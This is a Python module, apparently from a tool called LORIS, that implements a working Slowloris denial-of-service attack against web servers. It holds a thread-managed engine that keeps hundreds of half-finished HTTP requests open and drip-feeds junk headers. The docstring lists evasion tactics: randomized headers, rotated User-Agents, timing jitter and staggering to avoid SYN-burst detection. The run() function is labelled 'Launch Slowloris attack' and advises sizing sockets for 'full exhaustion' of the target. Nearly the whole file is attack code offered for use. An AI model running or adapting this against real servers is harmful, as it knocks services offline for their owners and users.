"""
modules/slowloris.py - LORIS
Slowloris: exhaust server socket/thread pool with incomplete HTTP requests.

How it works:
  HTTP/1.1 servers keep connections open waiting for complete headers.
  Slowloris sends partial headers (no trailing CRLF CRLF) and drip-feeds
  additional "X-Header: value\r\n" lines every `keep_alive_interval` seconds.

  Impact:
    - Apache (worker MPM): exhausts MaxRequestWorkers (default 256)
    - nginx: much more resistant (event-driven, async) but still vulnerable
      with low worker_connections tuning
    - IIS: vulnerable
    - Node.js: partially vulnerable (depends on http.maxHeaderSize)

  Detection evasion:
    - Randomize header names and values
    - Randomize socket creation timing
    - Rotate User-Agents
    - Vary keep-alive timing slightly

Variants:
  - Classic Slowloris (GET, slow headers)
  - Slow POST (Content-Length declared, body drip-fed) -> _slow_post_worker
  - Slow Read (RWIN=0, pause reading response) -> more complex, not implemented v1
"""

import socket
import ssl
import random
import time
import threading
from dataclasses import dataclass, field
from typing import Optional


# ---------------------------------------------------------------------------
# Header pool
# ---------------------------------------------------------------------------

_FAKE_HEADERS = [
    "X-Custom-Header-{}",
    "X-Forwarded-For-{}",
    "X-Request-Id-{}",
    "X-Trace-Id-{}",
    "X-Session-Token-{}",
    "X-Client-Version-{}",
]

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
]


def _rand_header() -> str:
    """Generate a random junk header line."""
    name = random.choice(_FAKE_HEADERS).format(random.randint(1, 9999))
    val  = "".join(chr(random.randint(65, 122)) for _ in range(random.randint(8, 32)))
    return f"{name}: {val}\r\n"


# ---------------------------------------------------------------------------
# Metrics
# ---------------------------------------------------------------------------

@dataclass
class SlowlorisMetrics:
    sockets_open: int = 0
    sockets_failed: int = 0
    sockets_expired: int = 0
    keepalives_sent: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def open(self) -> None:
        with self._lock: self.sockets_open += 1

    def fail(self) -> None:
        with self._lock: self.sockets_failed += 1

    def expire(self) -> None:
        with self._lock:
            self.sockets_open -= 1
            self.sockets_expired += 1

    def keepalive(self) -> None:
        with self._lock: self.keepalives_sent += 1

    def summary(self) -> dict:
        elapsed = time.time() - self.start_time
        return {
            "sockets_open":    self.sockets_open,
            "sockets_failed":  self.sockets_failed,
            "sockets_expired": self.sockets_expired,
            "keepalives_sent": self.keepalives_sent,
            "elapsed_s":       round(elapsed, 2),
        }


# ---------------------------------------------------------------------------
# Socket builder
# ---------------------------------------------------------------------------

def _build_socket(host: str, port: int, use_ssl: bool, timeout: float) -> Optional[socket.socket]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))

        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        # Send partial HTTP GET request (no trailing CRLF CRLF)
        partial_req = (
            f"GET /?{random.randint(0, 2**32)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(_USER_AGENTS)}\r\n"
            f"Accept-language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            # NO final \r\n -> server waits for more headers
        )
        s.send(partial_req.encode())
        return s

    except (socket.error, ssl.SSLError, OSError):
        return None


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class SlowlorisEngine:
    """
    Maintains `socket_count` slow connections.
    Drip-feeds junk headers every `keep_alive_interval` seconds.
    Automatically replaces expired/closed sockets.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        socket_count: int = 200,
        keep_alive_interval: float = 10.0,
        duration: int = 60,
        use_ssl: bool = False,
        socket_timeout: float = 30.0,
    ) -> None:
        self.host = host
        self.port = port
        self.socket_count = socket_count
        self.keep_alive_interval = keep_alive_interval
        self.duration = duration
        self.use_ssl = use_ssl
        self.socket_timeout = socket_timeout

        self.metrics = SlowlorisMetrics()
        self._sockets: list[socket.socket] = []
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def _fill_pool(self) -> None:
        """Open sockets until pool is full."""
        while len(self._sockets) < self.socket_count and not self._stop.is_set():
            s = _build_socket(self.host, self.port, self.use_ssl, self.socket_timeout)
            if s:
                self._sockets.append(s)
                self.metrics.open()
            else:
                self.metrics.fail()
            # Stagger creation slightly (avoid SYN burst detection)
            time.sleep(random.uniform(0.005, 0.02))

    def _keepalive_loop(self) -> None:
        deadline = time.time() + self.duration if self.duration > 0 else float("inf")

        # Initial fill
        self._fill_pool()

        while not self._stop.is_set() and time.time() < deadline:
            dead = []
            for s in self._sockets:
                try:
                    # Drip a junk header
                    s.send(_rand_header().encode())
                    self.metrics.keepalive()
                except (socket.error, OSError):
                    dead.append(s)

            # Remove dead sockets
            for s in dead:
                try:
                    s.close()
                except Exception:
                    pass
                self._sockets.remove(s)
                self.metrics.expire()

            # Refill
            self._fill_pool()

            # Wait before next keepalive round (add jitter)
            jitter = random.uniform(-1.5, 1.5)
            wait = max(0.5, self.keep_alive_interval + jitter)
            self._stop.wait(wait)

        # Cleanup
        for s in self._sockets:
            try: s.close()
            except Exception: pass
        self._sockets.clear()
        self._stop.set()

    def start(self) -> None:
        self._stop.clear()
        self._thread = threading.Thread(target=self._keepalive_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()

    def wait(self) -> None:
        if self._thread:
            self._thread.join(timeout=self.duration + 10)

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


def run(
    host: str,
    port: int = 80,
    socket_count: int = 200,
    keep_alive_interval: float = 10.0,
    duration: int = 60,
    use_ssl: bool = False,
) -> SlowlorisEngine:
    """
    Launch Slowloris attack.

    Args:
        host                : Target hostname or IP.
        port                : Target port (80 or 443).
        socket_count        : Number of concurrent slow sockets to maintain.
                              Set to server's MaxRequestWorkers + 10% for full exhaustion.
        keep_alive_interval : Seconds between junk header drips.
        duration            : Duration in seconds.
        use_ssl             : Wrap in TLS (for HTTPS targets).

    Returns:
        SlowlorisEngine instance (already started).
    """
    engine = SlowlorisEngine(
        host=host,
        port=port,
        socket_count=socket_count,
        keep_alive_interval=keep_alive_interval,
        duration=duration,
        use_ssl=use_ssl,
    )
    engine.start()
    return engine
